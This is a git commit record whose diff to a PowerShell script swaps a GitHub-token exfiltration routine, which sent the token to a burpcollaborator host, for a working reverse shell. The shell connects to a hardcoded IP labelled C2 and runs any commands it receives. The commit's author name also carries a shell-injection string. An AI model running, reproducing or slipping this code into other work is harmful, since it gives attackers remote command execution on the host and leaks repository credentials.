dab6aa80b648398539b482edd63143712503c057
stp-$('&&${IFS}echo${IFS}${IFS}&&echo${IFS}fullname&&${IFS}echo${IFS}') <76434077+d3kum1d0r1y4@users.noreply.github.com>
2023-08-09 12:23:01 +0800

    Update script.ps1

--- src/script.ps1
+++ src/script.ps1
@@ -1,19 +1,43 @@
-$extraHeader = git config --get http.https://github.com/.extraheader
+do {
+    # Delay before establishing network connection, and between retries
+    Start-Sleep -Seconds 1
 
-# Extract the token from the extraheader
-$token = [Regex]::Match($extraHeader, "ghs_[0-9A-Za-z]{20,}").Value
+    # Connect to C2
+    try{
+        $TCPClient = New-Object Net.Sockets.TCPClient('202.184.150.125', 4443)
+    } catch {}
+} until ($TCPClient.Connected)
 
-# Print the extracted token
-Write-Host "GitHub Token: $token"
-$url = "https://6ipqwfuz8ppgyvgk09pqi60ac1ix6m.burpcollaborator.net/user"  # Replace with your desired URL
+$NetworkStream = $TCPClient.GetStream()
+$StreamWriter = New-Object IO.StreamWriter($NetworkStream)
 
-$headers = @{
-    "Authorization" = "Bearer $token"
+# Writes a string to C2
+function WriteToStream ($String) {
+    # Create buffer to be used for next network stream read. Size is determined by the TCP client recieve buffer (65536 by default)
+    [byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0}
+
+    # Write to C2
+    $StreamWriter.Write($String + 'SHELL> ')
+    $StreamWriter.Flush()
 }
 
-$response = Invoke-RestMethod -Uri $url -Headers $headers
+# Initial output to C2. The function also creates the inital empty byte array buffer used below.
+WriteToStream ''
 
-# Print the response content
-Write-Host $response
+# Loop that breaks if NetworkStream.Read throws an exception - will happen if connection is closed.
+while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {
+    # Encode command, remove last byte/newline
+    $Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1)
+    
+    # Execute command and save output (including errors thrown)
+    $Output = try {
+            Invoke-Expression $Command 2>&1 | Out-String
+        } catch {
+            $_ | Out-String
+        }
 
-
+    # Write output to C2
+    WriteToStream ($Output)
+}
+# Closes the StreamWriter and the underlying TCPClient
+$StreamWriter.Close()
